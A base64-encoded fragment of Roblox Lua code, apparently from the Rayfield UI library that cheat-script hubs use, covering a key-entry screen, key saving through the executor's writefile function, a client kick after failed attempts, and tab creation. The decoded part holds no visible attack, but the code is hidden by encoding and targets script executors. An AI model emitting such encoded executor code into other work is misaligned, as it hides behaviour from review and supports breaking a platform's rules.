A9IDEKCQkJS2V5TWFpbi5JbnB1dC5JbnB1dEJveC5UZXh0VHJhbnNwYXJlbmN5ID0gMQoJCQlLZXlNYWluLk5vdGVUaXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoJCQlLZXlNYWluLk5vdGVNZXNzYWdlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgkJCUtleU1haW4uSGlkZS5JbWFnZVRyYW5zcGFyZW5jeSA9IDEKCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDAsIDUwMCwgMCwgMTg3KX0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uU2hhZG93LkltYWdlLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDAuNX0pOlBsYXkoKQoJCQl0YXNrLndhaXQoMC4wNSkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uU3VidGl0bGUsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCXRhc2sud2FpdCgwLjA1KQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uS2V5Tm90ZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLklucHV0LCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uSW5wdXQuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLklucHV0LklucHV0Qm94LCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQl0YXNrLndhaXQoMC4wNSkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLk5vdGVUaXRsZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLk5vdGVNZXNzYWdlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQl0YXNrLndhaXQoMC4xNSkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLkhpZGUsIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC4zfSk6UGxheSgpCgoKCQkJS2V5VUkuTWFpbi5JbnB1dC5JbnB1dEJveC5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlpZiAjS2V5VUkuTWFpbi5JbnB1dC5JbnB1dEJveC5UZXh0ID09IDAgdGhlbiByZXR1cm4gZW5kCgkJCQlsb2NhbCBLZXlGb3VuZCA9IGZhbHNlCgkJCQlsb2NhbCBGb3VuZEtleSA9ICcnCgkJCQlmb3IgXywgTUtleSBpbiBpcGFpcnMoU2V0dGluZ3MuS2V5U2V0dGluZ3MuS2V5KSBkbwoJCQkJCS0taWYgc3RyaW5nLmZpbmQoS2V5TWFpbi5JbnB1dC5JbnB1dEJveC5UZXh0LCBNS2V5KSB0aGVuCgkJCQkJLS0JS2V5Rm91bmQgPSB0cnVlCgkJCQkJLS0JRm91bmRLZXkgPSBNS2V5CgkJCQkJLS1lbmQKCgoJCQkJCS0tIHN0cmljdGVyIGtleSBjaGVjawoJCQkJCWlmIEtleU1haW4uSW5wdXQuSW5wdXRCb3guVGV4dCA9PSBNS2V5IHRoZW4KCQkJCQkJS2V5Rm91bmQgPSB0cnVlCgkJCQkJCUZvdW5kS2V5ID0gTUtleQoJCQkJCWVuZAoJCQkJZW5kCgkJCQlpZiBLZXlGb3VuZCB0aGVuIAoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4sIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMCwgNDY3LCAwLCAxNzUpfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLlNoYWRvdy5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5TdWJ0aXRsZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uS2V5Tm90ZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uSW5wdXQsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLklucHV0LlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLklucHV0LklucHV0Qm94LCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5Ob3RlVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLk5vdGVNZXNzYWdlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5IaWRlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQl0YXNrLndhaXQoMC41MSkKCQkJCQlQYXNzdGhyb3VnaCA9IHRydWUKCQkJCQlLZXlNYWluLlZpc2libGUgPSBmYWxzZQoJCQkJCWlmIFNldHRpbmdzLktleVNldHRpbmdzLlNhdmVLZXkgdGhlbgoJCQkJCQlpZiB3cml0ZWZpbGUgdGhlbgoJCQkJCQkJd3JpdGVmaWxlKFJheWZpZWxkRm9sZGVyLi4iL0tleSBTeXN0ZW0iLi4iLyIuLlNldHRpbmdzLktleVNldHRpbmdzLkZpbGVOYW1lLi5Db25maWd1cmF0aW9uRXh0ZW5zaW9uLCBGb3VuZEtleSkKCQkJCQkJZW5kCgkJCQkJCVJheWZpZWxkTGlicmFyeTpOb3RpZnkoe1RpdGxlID0gIktleSBTeXN0ZW0iLCBDb250ZW50ID0gIlRoZSBrZXkgZm9yIHRoaXMgc2NyaXB0IGhhcyBiZWVuIHNhdmVkIHN1Y2Nlc3NmdWxseS4iLCBJbWFnZSA9IDM2MDU1MjIyODR9KQoJCQkJCWVuZAoJCQkJZWxzZQoJCQkJCWlmIEF0dGVtcHRzUmVtYWluaW5nID09IDAgdGhlbgoJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4sIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCA0NjcsIDAsIDE3NSl9KTpQbGF5KCkKCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLlNoYWRvdy5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLlN1YnRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uS2V5Tm90ZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLklucHV0LCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uSW5wdXQuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLklucHV0LklucHV0Qm94LCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uTm90ZVRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uTm90ZU1lc3NhZ2UsIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5IaWRlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJdGFzay53YWl0KDAuNDUpCgkJCQkJCVBsYXllcnMuTG9jYWxQbGF5ZXI6S2ljaygiTm8gQXR0ZW1wdHMgUmVtYWluaW5nIikKCQkJCQkJZ2FtZTpTaHV0ZG93bigpCgkJCQkJZW5kCgkJCQkJS2V5TWFpbi5JbnB1dC5JbnB1dEJveC5UZXh0ID0gIiIKCQkJCQlBdHRlbXB0c1JlbWFpbmluZyA9IEF0dGVtcHRzUmVtYWluaW5nIC0gMQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCA0NjcsIDAsIDE3NSl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4sIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLkVsYXN0aWMpLCB7UG9zaXRpb24gPSBVRGltMi5uZXcoMC40OTUsMCwwLjUsMCl9KTpQbGF5KCkKCQkJCQl0YXNrLndhaXQoMC4xKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbiwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRWxhc3RpYyksIHtQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUwNSwwLDAuNSwwKX0pOlBsYXkoKQoJCQkJCXRhc2sud2FpdCgwLjEpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsMCwwLjUsMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4sIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMCwgNTAwLCAwLCAxODcpfSk6UGxheSgpCgkJCQllbmQKCQkJZW5kKQoKCQkJS2V5TWFpbi5IaWRlLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDAsIDQ2NywgMCwgMTc1KX0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLlNoYWRvdy5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uU3VidGl0bGUsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleU1haW4uS2V5Tm90ZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5JbnB1dCwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5JbnB1dC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLklucHV0LklucHV0Qm94LCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXlNYWluLk5vdGVUaXRsZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5Ob3RlTWVzc2FnZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5TWFpbi5IaWRlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCXRhc2sud2FpdCgwLjUxKQoJCQkJUmF5ZmllbGRMaWJyYXJ5OkRlc3Ryb3koKQoJCQkJS2V5VUk6RGVzdHJveSgpCgkJCWVuZCkKCQllbHNlCgkJCVBhc3N0aHJvdWdoID0gdHJ1ZQoJCWVuZAoJZW5kCglpZiBTZXR0aW5ncy5LZXlTeXN0ZW0gdGhlbgoJCXJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBQYXNzdGhyb3VnaAoJZW5kCgoJTm90aWZpY2F0aW9ucy5UZW1wbGF0ZS5WaXNpYmxlID0gZmFsc2UKCU5vdGlmaWNhdGlvbnMuVmlzaWJsZSA9IHRydWUKCVJheWZpZWxkLkVuYWJsZWQgPSB0cnVlCgoJdGFzay53YWl0KDAuNSkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbiwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TaGFkb3cuSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC42fSk6UGxheSgpCgl0YXNrLndhaXQoMC4xKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShMb2FkaW5nRnJhbWUuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgl0YXNrLndhaXQoMC4wNSkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTG9hZGluZ0ZyYW1lLlN1YnRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJdGFzay53YWl0KDAuMDUpCglUd2VlblNlcnZpY2U6Q3JlYXRlKExvYWRpbmdGcmFtZS5WZXJzaW9uLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoKCglFbGVtZW50cy5UZW1wbGF0ZS5MYXlvdXRPcmRlciA9IDEwMDAwMAoJRWxlbWVudHMuVGVtcGxhdGUuVmlzaWJsZSA9IGZhbHNlCgoJRWxlbWVudHMuVUlQYWdlTGF5b3V0LkZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uSG9yaXpvbnRhbAoJVGFiTGlzdC5UZW1wbGF0ZS5WaXNpYmxlID0gZmFsc2UKCgktLSBUYWIKCWxvY2FsIEZpcnN0VGFiID0gZmFsc2UKCWxvY2FsIFdpbmRvdyA9IHt9CglmdW5jdGlvbiBXaW5kb3c6Q3JlYXRlVGFiKE5hbWUsIEltYWdlLCBFeHQpCgkJbG9jYWwgU0RvbmUgPSBmYWxzZQoJCWxvY2FsIFRhYkJ1dHRvbiA9IFRhYkxpc3QuVGVtcGxhdGU6Q2xvbmUoKQoJCVRhYkJ1dHRvbi5OYW1lID0gTmFtZQoJCVRhYkJ1dHRvbi5UaXRsZS5UZXh0ID0gTmFtZQoJCVRhYkJ1dHRvbi5QYXJlbnQgPSBUYWJMaXN0CgkJVGFiQnV0dG9uLlRpdGxlLlRleHRXcmFwcGVkID0gZmFsc2UKCQlUYWJCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCBUYWJCdXR0b24uVGl0bGUuVGV4dEJvdW5kcy5YICsgMzAsIDAsIDMwKQoKCQlpZiBJbWFnZSBhbmQgSW1hZ2Ugfj0gMCB0aGVuCgkJCWlmIHR5cGVvZihJbWFnZSkgPT0gJ3N0cmluZycgYW5kIEljb25zIHRoZW4KCQkJCWxvY2FsIGFzc2V0ID0gZ2V0SWNvbihJbWFnZSkKCgkJCQlUYWJCdXR0b24uSW1hZ2UuSW1hZ2UgPSAncmJ4YXNzZXRpZDovLycuLmFzc2V0LmlkCgkJCQlUYWJCdXR0b24uSW1hZ2UuSW1hZ2VSZWN0T2Zmc2V0ID0gYXNzZXQuaW1hZ2VSZWN0T2Zmc2V0CgkJCQlUYWJCdXR0b24uSW1hZ2UuSW1hZ2VSZWN0U2l6ZSA9IGFzc2V0LmltYWdlUmVjdFNpemUKCQkJZWxzZQoJCQkJVGFiQnV0dG9uLkltYWdlLkltYWdlID0gZ2V0QXNzZXRVcmkoSW1hZ2UpCgkJCWVuZAoKCQkJVGFiQnV0dG9uLlRpdGxlLkFuY2hvclBvaW50ID0gVmVjdG9yMi5uZXcoMCwgMC41KQoJCQlUYWJCdXR0b24uVGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMzcsIDAuNSwgMCkKCQkJVGFiQnV0dG9uLkltYWdlLlZpc2libGUgPSB0cnVlCgkJCVRhYkJ1dHRvbi5UaXRsZS5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAoJCQlUYWJCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCBUYWJCdXR0b24uVGl0bGUuVGV4dEJvdW5kcy5YICsgNTIsIDAsIDMwKQoJCWVuZAoKCgoJCVRhYkJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCVRhYkJ1dHRvbi5UaXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoJCVRhYkJ1dHRvbi5JbWFnZS5JbWFnZVRyYW5zcGFyZW5jeSA9IDEKCQlUYWJCdXR0b24uVUlTdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoKCQlUYWJCdXR0b24uVmlzaWJsZSA9IG5vdCBFeHQgb3IgZmFsc2UKCgkJLS0gQ3JlYXRlIEVsZW1lbnRzIFBhZ2UKCQlsb2NhbCBUYWJQYWdlID0gRWxlbWVudHMuVGVtcGxhdGU6Q2xvbmUoKQoJCVRhYlBhZ2UuTmFtZSA9IE5hbWUKCQlUYWJQYWdlLlZpc2libGUgPSB0cnVlCgoJCVRhYlBhZ2UuTGF5b3V0T3JkZXIgPSAjRWxlbWVudHM6R2V0Q2hpbGRyZW4oKSBvciBFeHQgYW5kIDEwMDAwCgoJCWZvciBfLCBUZW1wbGF0ZUVsZW1lbnQgaW4gaXBhaXJzKFRhYlBhZ2U6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJaWYgVGVtcGxhdGVFbGVtZW50LkNsYXNzTmFtZSA9PSAiRnJhbWUiIGFuZCBUZW1wbGF0ZUVsZW1lbnQuTmFtZSB+PSAiUGxhY2Vob2xkZXIiIHRoZW4KCQkJCVRlbXBsYXRlRWxlbWVudDpEZXN0cm95KCkKCQkJZW5kCgkJZW5kCgoJCVRhYlBhZ2UuUGFyZW50ID0gRWxlbWVudHMKCQlpZiBub3QgRmlyc3RUYWIgYW5kIG5vdCBFeHQgdGhlbgoJCQlFbGVtZW50cy5VSVBhZ2VMYXlvdXQuQW5pbWF0ZWQgPSBmYWxzZQoJCQlFbGVtZW50cy5VSVBhZ2VMYXlvdXQ6SnVtcFRvKFRhYlBhZ2UpCgkJCUVsZW1lbnRzLlVJUGFnZUxheW91dC5BbmltYXRlZCA9IHRydWUKCQllbmQKCgkJVGFiQnV0dG9uLlVJU3Ryb2tlLkNvbG9yID0gU2VsZWN0ZWRUaGVtZS5UYWJTdHJva2UKCgkJaWYgRWxlbWVudHMuVUlQYWdlTGF5b3V0LkN1cnJlbnRQYWdlID09IFRhYlBhZ2UgdGhlbgoJCQlUYWJCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiQmFja2dyb3VuZFNlbGVjdGVkCgkJCVRhYkJ1dHRvbi5JbWFnZS5JbWFnZUNvbG9yMyA9IFNlbGVjdGVkVGhlbWUuU2VsZWN0ZWRUYWJUZXh0Q29sb3IKCQkJVGFiQnV0dG9uLlRpdGxlLlRleHRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlNlbGVjdGVkVGFiVGV4dENvbG9yCgkJZWxzZQoJCQlUYWJCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiQmFja2dyb3VuZAoJCQlUYWJCdXR0b24uSW1hZ2UuSW1hZ2VDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRhYlRleHRDb2xvcgoJCQlUYWJCdXR0b24uVGl0bGUuVGV4dENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVGFiVGV4dENvbG9yCgkJZW5kCgoKCQktLSBBbmltYXRlC